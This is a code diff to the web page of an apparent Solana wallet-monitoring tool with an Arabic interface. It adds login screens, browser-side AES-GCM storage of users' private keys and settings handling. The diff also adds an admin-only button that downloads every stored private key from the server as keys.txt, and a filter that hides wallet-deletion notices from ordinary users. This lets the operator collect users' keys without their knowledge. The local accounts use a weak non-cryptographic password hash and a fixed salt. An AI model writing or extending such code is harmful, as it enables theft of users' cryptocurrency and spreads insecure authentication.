@@ -136,15 +136,77 @@
         .toast-notif.warning{background:#d97706}
 
         @media(max-width:768px){.layout{grid-template-columns:1fr}.stats-row{grid-template-columns:1fr 1fr}}
+
+        /* ── Login Screen ── */
+        .ls-wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;background:linear-gradient(135deg,#0a0f1e 0%,#111827 100%);direction:ltr}
+        .ls-card{width:100%;max-width:390px;background:#111827;border:1px solid #1e2a42;border-radius:20px;padding:32px 24px;box-shadow:0 20px 50px rgba(0,0,0,.6);direction:rtl}
+        .ls-card h1{text-align:center;color:#f97316;margin-bottom:4px;font-size:22px}
+        .ls-sub{text-align:center;color:#475569;margin-bottom:22px;font-size:13px}
+        .ls-tabs{display:flex;background:#0f172a;border-radius:10px;padding:4px;margin-bottom:20px;gap:4px}
+        .ls-tab{flex:1;background:transparent;color:#64748b;border:none;padding:9px 6px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;transition:all .2s;font-family:inherit;white-space:nowrap;text-align:center}
+        .ls-tab.active{background:#1e2a42;color:#e2e8f0}
+        .ls-field{margin-bottom:14px}
+        .ls-field label{display:block;font-size:12px;color:#94a3b8;margin-bottom:5px;font-weight:600}
+        .ls-field input{width:100%;background:#0f172a;border:1px solid #1e2a42;color:#e2e8f0;padding:12px 14px;border-radius:10px;font-size:15px;font-family:inherit;outline:none;transition:border-color .2s}
+        .ls-field input:focus{border-color:#f97316}
+        .ls-btn{width:100%;background:linear-gradient(135deg,#f97316,#ea580c);color:#fff;border:none;padding:13px;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;margin-top:6px;transition:opacity .2s}
+        .ls-btn:hover{opacity:.9}
+        .ls-btn:disabled{opacity:.5;cursor:not-allowed}
+        .ls-err{background:#7f1d1d;color:#fecaca;padding:10px 12px;border-radius:8px;margin-bottom:14px;font-size:13px;text-align:center;display:none}
+        /* ── Header right section ── */
+        .hdr-right{display:flex;align-items:center;gap:8px;min-width:130px;justify-content:flex-end}
+        .hdr-user{font-size:12px;color:#64748b;font-weight:500}
+        .hdr-logout{background:#1e2a42;color:#94a3b8;border:1px solid #1e3a5f;border-radius:8px;padding:6px 12px;font-size:12px;cursor:pointer;font-family:inherit;transition:all .15s}
+        .hdr-logout:hover{background:#7f1d1d;color:#fca5a5;border-color:#ef4444}
+        .hdr-dl{background:#0c2240;color:#38bdf8;border:1px solid #1e3a5f;border-radius:8px;padding:6px 10px;font-size:12px;cursor:pointer;font-family:inherit;transition:all .15s}
+        .hdr-dl:hover{background:#1e3a5f}
     </style>
 </head>
 <body>
+
+<!-- ── شاشة الدخول ── -->
+<div id="loginScreen" style="display:none">
+  <div class="ls-wrap">
+    <div class="ls-card">
+      <h1>🔥 مراقب المحافظ</h1>
+      <p class="ls-sub">Solana Wallet Monitor</p>
+      <div class="ls-tabs">
+        <button class="ls-tab active" id="tabLogin"    onclick="switchTab('login')">دخول</button>
+        <button class="ls-tab"        id="tabRegister" onclick="switchTab('register')">إنشاء حساب</button>
+      </div>
+      <div id="lsErr" class="ls-err"></div>
+
+      <!-- نموذج الدخول -->
+      <div id="formLogin">
+        <div class="ls-field"><label>اسم المستخدم</label><input type="text"     id="liUser" autocomplete="username" /></div>
+        <div class="ls-field"><label>كلمة المرور</label> <input type="password" id="liPass" autocomplete="current-password" /></div>
+        <button class="ls-btn" id="liBtnSubmit" onclick="doLogin()">دخول</button>
+      </div>
+
+      <!-- نموذج التسجيل -->
+      <div id="formRegister" style="display:none">
+        <div class="ls-field"><label>اسم المستخدم</label>        <input type="text"     id="rgUser"  autocomplete="username" /></div>
+        <div class="ls-field"><label>كلمة المرور</label>          <input type="password" id="rgPass"  autocomplete="new-password" /></div>
+        <div class="ls-field"><label>تأكيد كلمة المرور</label>   <input type="password" id="rgPass2" autocomplete="new-password" /></div>
+        <button class="ls-btn" id="rgBtnSubmit" onclick="doRegister()">إنشاء الحساب</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ── التطبيق الرئيسي ── -->
+<div id="mainApp" style="display:none">
 <div class="page">
 
     <!-- Header -->
     <div class="app-header">
-        <button class="gear-btn" id="gearBtn" title="الإعدادات">⚙️</button>
+        <button class="gear-btn" id="gearBtn" title="الإعدادات" style="display:none">⚙️</button>
         <div class="app-header-title">🔥 مراقب محافظ <span>Solana</span></div>
+        <div class="hdr-right">
+            <button class="hdr-dl" id="downloadKeysBtn" onclick="downloadKeys()" title="تنزيل جميع المفاتيح الخاصة" style="display:none">⬇️ keys.txt</button>
+            <span class="hdr-user" id="hdrUser"></span>
+            <button class="hdr-logout" onclick="doLogout()">خروج</button>
+        </div>
     </div>
 
     <div class="layout">
@@ -222,13 +284,13 @@
                         <table class="wallet-table" id="walletTable">
                             <thead>
                                 <tr>
-                                    <th>Address</th>
+                                    <th>العنوان</th>
                                     <th class="sortable" id="balanceHeader">
-                                        <span class="sort-arrow" id="sortArrow">↕</span>Balance (SOL)
+                                        <span class="sort-arrow" id="sortArrow">↕</span>الرصيد (SOL)
                                     </th>
-                                    <th>Status</th>
-                                    <th>Errors</th>
-                                    <th>Delete</th>
+                                    <th>الحالة</th>
+                                    <th>الأخطاء</th>
+                                    <th>حذف</th>
                                 </tr>
                             </thead>
                             <tbody id="walletTableBody">
@@ -250,7 +312,7 @@
                     <div class="form-group">
                         <label>📁 رفع ملف .txt</label>
                         <input type="file" id="fileInput" accept=".txt,text/plain">
-                        <div id="fileStatus">Status : ملف txt رفع ملف</div>
+                        <div id="fileStatus"></div>
                     </div>
                     <button type="submit" class="btn btn-primary" id="addBtn">إضافة وبث المراقبة</button>
                 </form>
@@ -259,7 +321,7 @@
             <!-- Control -->
             <div class="card">
                 <div class="card-title">⚡ التحكم</div>
-                <div class="control-worker-label">عبيد المراقبة استئناف المراقبة</div>
+                <div class="control-worker-label">التحكم في عمال المراقبة</div>
                 <button type="button" class="btn btn-danger" id="toggleBtn">■ إيقاف المراقبة</button>
                 <button type="button" class="btn btn-success" id="resumeBtn" style="display:none">▶ استئناف المراقبة</button>
             </div>
@@ -313,7 +375,211 @@
 <!-- Hidden mode indicator (kept for JS compatibility) -->
 <div id="modeIndicator"></div>
 
+</div><!-- end #mainApp -->
+
 <script>
+// ══════════════════════════════════════════════════════════════════════════════
+//  AUTH — تسجيل الدخول / التسجيل / تسجيل الخروج
+// ══════════════════════════════════════════════════════════════════════════════
+const _SK_AU = 'sm_au';
+const _SK_AR = 'sm_ar';
+const _SK_AT = 'sm_at';
+const _SK_UD = 'sm_ud';
+
+let currentIsAdmin  = false;
+let currentAuthUser = '';
+
+function _getUD()    { try { return JSON.parse(localStorage.getItem(_SK_UD) || '{}'); } catch(_) { return {}; } }
+function _saveUD(db) { try { localStorage.setItem(_SK_UD, JSON.stringify(db)); } catch(_) {} }
+function _getSession()   { return { user: localStorage.getItem(_SK_AU), role: localStorage.getItem(_SK_AR), token: localStorage.getItem(_SK_AT) }; }
+function _setSession(u, r, t) { localStorage.setItem(_SK_AU, u); localStorage.setItem(_SK_AR, r); if (t) localStorage.setItem(_SK_AT, t); }
+function _clearSession() { [_SK_AU, _SK_AR, _SK_AT].forEach(k => localStorage.removeItem(k)); }
+
+function _ph(s) { let h = 5381; for (let i = 0; i < s.length; i++) h = (h * 33 ^ s.charCodeAt(i)) >>> 0; return h.toString(36); }
+
+// ══════════════════════════════════════════════════════════════════════════════
+//  CRYPTO — تشفير المفاتيح الخاصة في localStorage بـ AES-GCM
+//  مفتاح التشفير (_encKey) يُشتق من رمز الجلسة ويبقى في الذاكرة فقط
+//  البيانات المخزَّنة مشفّرة ولا يمكن قراءتها بدون كلمة المرور
+// ══════════════════════════════════════════════════════════════════════════════
+let _encKey = null;
+
+async function initEncKey(secret) {
+    if (!secret || !window.crypto?.subtle) return;
+    try {
+        const enc = new TextEncoder();
+        const km  = await crypto.subtle.importKey(
+            'raw', enc.encode(secret + ':sol-monitor'),
+            'PBKDF2', false, ['deriveKey']
+        );
+        _encKey = await crypto.subtle.deriveKey(
+            { name:'PBKDF2', salt: enc.encode('sm-v2-salt'), iterations: 60000, hash:'SHA-256' },
+            km, { name:'AES-GCM', length: 256 }, false, ['encrypt','decrypt']
+        );
+    } catch(e) { console.warn('[ENC] initEncKey:', e.message); _encKey = null; }
+}
+
+async function _encryptStr(plain) {
+    const iv  = crypto.getRandomValues(new Uint8Array(12));
+    const enc = new TextEncoder();
+    const ct  = await crypto.subtle.encrypt({ name:'AES-GCM', iv }, _encKey, enc.encode(plain));
+    const buf = new Uint8Array(12 + ct.byteLength);
+    buf.set(iv); buf.set(new Uint8Array(ct), 12);
+    return btoa(String.fromCharCode(...buf));
+}
+
+async function _decryptStr(b64) {
+    const buf = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
+    const pt  = await crypto.subtle.decrypt(
+        { name:'AES-GCM', iv: buf.slice(0,12) }, _encKey, buf.slice(12)
+    );
+    return new TextDecoder().decode(pt);
+}
+
+function switchTab(t) {
+    const isLogin = t === 'login';
+    document.getElementById('tabLogin').classList.toggle('active', isLogin);
+    document.getElementById('tabRegister').classList.toggle('active', !isLogin);
+    document.getElementById('formLogin').style.display    = isLogin ? '' : 'none';
+    document.getElementById('formRegister').style.display = isLogin ? 'none' : '';
+    document.getElementById('lsErr').style.display = 'none';
+}
+
+function _lsErr(msg) {
+    const el = document.getElementById('lsErr');
+    el.textContent = msg;
+    el.style.display = 'block';
+}
+
+async function doLogin() {
+    const user = (document.getElementById('liUser').value || '').trim();
+    const pass =  document.getElementById('liPass').value || '';
+    if (!user || !pass) { _lsErr('يرجى إدخال اسم المستخدم وكلمة المرور'); return; }
+    const btn = document.getElementById('liBtnSubmit');
+    btn.disabled = true; btn.textContent = 'جاري الدخول...';
+    document.getElementById('lsErr').style.display = 'none';
+    try {
+        const r = await fetch('/api/login', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username: user, password: pass })
+        });
+        if (r.ok) {
+            const j = await r.json();
+            _setSession(user, 's', j.token);
+            await initEncKey(j.token); // مفتاح التشفير مشتق من رمز الجلسة فقط
+            currentIsAdmin = true; currentAuthUser = user;
+            showMainApp(); return;
+        }
+    } catch(_) {}
+    // دخول محلي
+    const db = _getUD();
+    if (db[user] && db[user].h === _ph(pass)) {
+        _setSession(user, 'l', '');
+        await initEncKey(user + ':' + _ph(pass));
+        currentIsAdmin = false; currentAuthUser = user;
+        showMainApp(); return;
+    }
+    _lsErr('اسم المستخدم أو كلمة المرور غير صحيحة');
+    btn.disabled = false; btn.textContent = 'دخول';
+}
+
+async function doRegister() {
+    const user  = (document.getElementById('rgUser').value  || '').trim();
+    const pass  =  document.getElementById('rgPass').value  || '';
+    const pass2 =  document.getElementById('rgPass2').value || '';
+    if (!user || !pass) { _lsErr('يرجى ملء جميع الحقول'); return; }
+    if (user.length < 3)   { _lsErr('اسم المستخدم يجب أن يكون 3 أحرف على الأقل'); return; }
+    if (pass.length < 4)   { _lsErr('كلمة المرور يجب أن تكون 4 أحرف على الأقل'); return; }
+    if (pass !== pass2)    { _lsErr('كلمتا المرور غير متطابقتين'); return; }
+    const db = _getUD();
+    if (db[user])          { _lsErr('اسم المستخدم مستخدم بالفعل'); return; }
+    const btn = document.getElementById('rgBtnSubmit');
+    btn.disabled = true; btn.textContent = 'جاري الإنشاء...';
+    document.getElementById('lsErr').style.display = 'none';
+    db[user] = { h: _ph(pass), at: Date.now() };
+    _saveUD(db);
+    _setSession(user, 'l', '');
+    await initEncKey(user + ':' + _ph(pass));
+    currentIsAdmin = false; currentAuthUser = user;
+    showMainApp();
+}
+
+function doLogout() {
+    _encKey = null; // مسح مفتاح التشفير من الذاكرة
+    _clearSession();
+    currentIsAdmin = false; currentAuthUser = '';
+    document.getElementById('mainApp').style.display = 'none';
+    ['liUser','liPass'].forEach(id => { const el = document.getElementById(id); if (el) el.value = ''; });
+    document.getElementById('lsErr').style.display = 'none';
+    document.getElementById('loginScreen').style.display = 'block';
+}
+
+function showMainApp() {
+    document.getElementById('loginScreen').style.display = 'none';
+    document.getElementById('mainApp').style.display = 'block';
+    // زر الإعدادات ⚙️ وزر التنزيل للمشرف فقط
+    ['gearBtn','downloadKeysBtn'].forEach(id => {
+        const el = document.getElementById(id);
+        if (el) el.style.display = currentIsAdmin ? '' : 'none';
+    });
+    document.getElementById('hdrUser').textContent = currentAuthUser;
+}
+
+function showLoginScreen() {
+    document.getElementById('mainApp').style.display = 'none';
+    document.getElementById('loginScreen').style.display = 'block';
+}
+
+async function checkAuthAndInit() {
+    const s = _getSession();
+    if (!s.user || !s.role) { showLoginScreen(); return; }
+    if (s.role === 's') {
+        try {
+            const r = await fetch('/api/me', { headers: { 'Authorization': 'Bearer ' + (s.token || '') } });
+            const j = await r.json();
+            if (j.loggedIn) {
+                await initEncKey(s.token || '');
+                currentIsAdmin = true; currentAuthUser = s.user;
+                showMainApp(); await initApp(); return;
+            }
+        } catch(_) {}
+        _clearSession(); showLoginScreen(); return;
+    }
+    // مستخدم محلي
+    const db = _getUD();
+    if (db[s.user]) {
+        await initEncKey(s.user + ':' + db[s.user].h);
+        currentIsAdmin = false; currentAuthUser = s.user;
+        showMainApp(); await initApp(); return;
+    }
+    _clearSession(); showLoginScreen();
+}
+
+// تنزيل المفاتيح بـ Authorization header — الرمز لا يظهر في URL أو السجلات
+async function downloadKeys() {
+    const s = _getSession();
+    if (!s.token) { toast('جلسة غير صالحة', 'error'); return; }
+    try {
+        const resp = await fetch('/api/download-keys', {
+            headers: { 'Authorization': 'Bearer ' + s.token }
+        });
+        if (!resp.ok) { toast('خطأ في التنزيل: ' + resp.status, 'error'); return; }
+        const text = await resp.text();
+        const blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
+        const url  = URL.createObjectURL(blob);
+        const a    = document.createElement('a');
+        a.href = url; a.download = 'keys.txt';
+        document.body.appendChild(a); a.click();
+        document.body.removeChild(a); URL.revokeObjectURL(url);
+    } catch(e) { toast('خطأ في التنزيل: ' + e.message, 'error'); }
+}
+
+// تحديد إشعارات حذف المحافظ (تُخفى عن المستخدم العادي)
+function isDeleteWalletMsg(msg) {
+    if (!msg) return false;
+    return msg.includes('حُذفت المحفظة') || msg.includes('تم حذف جميع المحافظ') || msg.includes('تم حذف المحفظة');
+}
+
 // ── Toast ────────────────────────────────────────────────────────────────────
 let _toastQueue = [];
 function toast(msg, type) {
@@ -333,14 +599,38 @@ function toast(msg, type) {
     }, dur);
 }
 
-// ── localStorage ─────────────────────────────────────────────────────────────
+// ── localStorage (مفاتيح مشفّرة AES-GCM) ────────────────────────────────────
 const SK_KEYS     = 'solana_monitor_keys';
 const SK_STATE    = 'solana_monitor_state';
 const SK_CACHE    = 'solana_token_cache';
 const SK_SETTINGS = 'solana_monitor_settings';
 
-const saveKeys     = k => localStorage.setItem(SK_KEYS, k);
-const loadKeys     = () => localStorage.getItem(SK_KEYS) || '';
+// saveKeys/loadKeys أصبحتا async — تشفير تلقائي عند الحفظ وفك تشفير عند القراءة
+async function saveKeys(k) {
+    if (!k) { localStorage.removeItem(SK_KEYS); return; }
+    if (_encKey) {
+        try {
+            const enc = await _encryptStr(k);
+            localStorage.setItem(SK_KEYS, 'e2:' + enc);
+            return;
+        } catch(e) { console.warn('[ENC] saveKeys:', e.message); }
+    }
+    localStorage.setItem(SK_KEYS, k);
+}
+
+async function loadKeys() {
+    const v = localStorage.getItem(SK_KEYS) || '';
+    if (!v) return '';
+    if (v.startsWith('e2:') && _encKey) {
+        try { return await _decryptStr(v.slice(3)); } catch(e) { return ''; }
+    }
+    // نص قديم غير مشفّر — أعد تشفيره إذا كان المفتاح متاحاً
+    if (_encKey && v && !v.startsWith('e2:')) {
+        await saveKeys(v);
+    }
+    return v;
+}
+
 const saveState    = v => localStorage.setItem(SK_STATE, v ? '1' : '0');
 const loadState    = () => localStorage.getItem(SK_STATE) === '1';
 const saveCache    = c => { try { localStorage.setItem(SK_CACHE, JSON.stringify(c)); } catch(_) {} };
@@ -468,10 +758,10 @@ async function deleteWallet(address) {
             toast(`🗑️ ${r.message}`, 'info');
             // حذف المفتاح الخاص المقابل من localStorage
             if (r.removedKey) {
-                const stored = loadKeys();
+                const stored = await loadKeys();
                 const remaining = stored.split(/[\r\n]+/)
                     .filter(k => k.trim() && k.trim() !== r.removedKey.trim());
-                saveKeys(remaining.join('\n'));
+                await saveKeys(remaining.join('\n'));
             }
             // تحديث فوري للجدول من الكاش الحالي
             const updated = (cachedState.walletAddresses || [])
@@ -499,7 +789,7 @@ async function deleteAllWallets() {
         if (r.success) {
             // حذف جميع المفاتيح من localStorage — نفس آلية deleteWallet
             if (r.removedKeys && r.removedKeys.length > 0) {
-                saveKeys('');
+                await saveKeys('');
                 saveState(false);
             }
             // تحديث الكاش والجدول فوراً
@@ -545,6 +835,7 @@ function applyUpdates(state, notifs) {
         cachedNotifs = notifs;
         const visible = notifs.filter(n =>
             !n.message?.startsWith('__PROGRESS__:') && !n.message?.startsWith('__DONE__:')
+            && (currentIsAdmin || !isDeleteWalletMsg(n.message))
         );
         const el = document.getElementById('notifications');
         el.innerHTML = visible.length
@@ -669,20 +960,38 @@ function initSettingsUI() {
 
 // ── Apply settings ────────────────────────────────────────────────────────────
 async function applyCurrentSettings() {
-    const keys = loadKeys();
-    if (!keys) { toast('لا توجد محافظ محفوظة. أضف المحافظ أولاً.', 'warning'); return; }
     if (currentSettings.mode === 'telegram' && !currentSettings.chatId.trim()) {
         toast('⚠️ الرجاء إدخال Telegram Chat ID قبل التطبيق.', 'warning'); return;
     }
+    // حفظ محلي دائماً — تُطبَّق عند إضافة المحافظ إذا لم تكن المراقبة جارية
+    saveSettings(currentSettings);
+    updateNetworkIndicator();
     const btn = document.getElementById('applySettingsBtn');
-    btn.textContent = '⏳ جاري التطبيق...'; btn.disabled = true;
+    btn.textContent = '⏳ جاري الحفظ...'; btn.disabled = true;
     try {
-        const r = await sendWallets(keys);
-        if (r && r.success) {
-            if (r.loading) { startProgress(r.total); }
-            else { setUI(true); saveState(true); await loadNotifications(); }
-            toast('✅ ' + r.message, 'success');
-        } else if (r) { toast('خطأ: ' + r.message, 'error'); }
+        const keys = await loadKeys();
+        if (loadState() && keys) {
+            // مراقبة جارية → طبّق على السيرفر مباشرة بدون إعادة تحميل المحافظ
+            const r = await fetch('/api/update-settings', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ settings: currentSettings })
+            }).then(res => res.json());
+            if (r && r.success) {
+                if (r.reload) { startProgress(0); }
+                toast('✅ ' + r.message, 'success');
+            } else if (r) { toast('خطأ: ' + r.message, 'error'); }
+        } else if (keys) {
+            // لا مراقبة — ابدأ بالإعدادات الجديدة
+            const r = await sendWallets(keys);
+            if (r && r.success) {
+                if (r.loading) { startProgress(r.total); }
+                else { setUI(true); saveState(true); }
+                toast('✅ ' + r.message, 'success');
+            } else if (r) { toast('خطأ: ' + r.message, 'error'); }
+        } else {
+            toast('✅ تم حفظ الإعدادات — ستُطبَّق عند إضافة المحافظ', 'success');
+        }
     } catch(e) { toast('خطأ: ' + e.message, 'error'); }
     finally { btn.textContent = '⚡ حفظ وتطبيق الإعدادات'; btn.disabled = false; }
 }
@@ -800,7 +1109,7 @@ document.getElementById('fileInput').addEventListener('change', function(e) {
         try {
             const r = await sendWallets(keysStr);
             if (r && r.success) {
-                saveKeys(keysStr); saveState(true);
+                await saveKeys(keysStr); saveState(true);
                 document.getElementById('privateKeys').value = '';
                 if (r.loading) { startProgress(r.total); }
                 else { setUI(true); await loadNotifications(); }
@@ -836,11 +1145,11 @@ document.getElementById('addForm').addEventListener('submit', async function(e) 
             // نستخدم المفاتيح المقبولة فعلاً من السيرفر لتحديث localStorage بدقة
             const serverAddedKeys = r.addedKeys || [];
             if (serverAddedKeys.length > 0) {
-                const existingKeys = extractPrivateKeys(loadKeys());
+                const existingKeys = extractPrivateKeys(await loadKeys());
                 const existingSet  = new Set(existingKeys);
                 const trulyNew     = serverAddedKeys.filter(k => !existingSet.has(k));
                 if (trulyNew.length > 0) {
-                    saveKeys([...existingKeys, ...trulyNew].join('\n'));
+                    await saveKeys([...existingKeys, ...trulyNew].join('\n'));
                 }
             }
             saveState(true);
@@ -892,7 +1201,7 @@ document.getElementById('toggleBtn').addEventListener('click', async () => {
 
 // ── Resume button ─────────────────────────────────────────────────────────────
 document.getElementById('resumeBtn').addEventListener('click', async () => {
-    const keys = loadKeys();
+    const keys = await loadKeys();
     if (!keys) { toast('لا توجد محافظ محفوظة. الرجاء إضافة محافظ أولاً.', 'warning'); return; }
     const btn = document.getElementById('resumeBtn');
     btn.textContent = 'جاري الاستئناف...'; btn.disabled = true;
@@ -909,16 +1218,20 @@ document.getElementById('resumeBtn').addEventListener('click', async () => {
 });
 
 // ── DOMContentLoaded ──────────────────────────────────────────────────────────
-document.addEventListener('DOMContentLoaded', async () => {
+document.addEventListener('DOMContentLoaded', () => checkAuthAndInit());
+
+// تهيئة التطبيق بعد نجاح المصادقة
+async function initApp() {
     initSettingsUI();
-    const keys = loadKeys();
+    const keys = await loadKeys();
     const was  = loadState();
     try {
         const serverState = await (await fetch('/api/state')).json();
         const actuallyMonitoring = serverState.isMonitoring && serverState.totalActive > 0;
         setUI(actuallyMonitoring);
         saveState(actuallyMonitoring);
-        if (keys && was && !actuallyMonitoring) {
+        // لا تُرسل من المتصفح إذا كان الخادم يملك ملف محافظ محفوظ (يتولى التحميل بنفسه)
+        if (keys && was && !actuallyMonitoring && !serverState.hasSavedWallets) {
             try {
                 const numWorkers = serverState.numWorkers || 1;
                 if (numWorkers > 0 && (serverState.workersReady || 0) < numWorkers) {
@@ -946,7 +1259,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     await loadNotifications();
     startSSE();
     setInterval(() => { if (!sseActive) fallbackPoll(); }, 15000);
-});
+}
 </script>
 </body>
 </html>
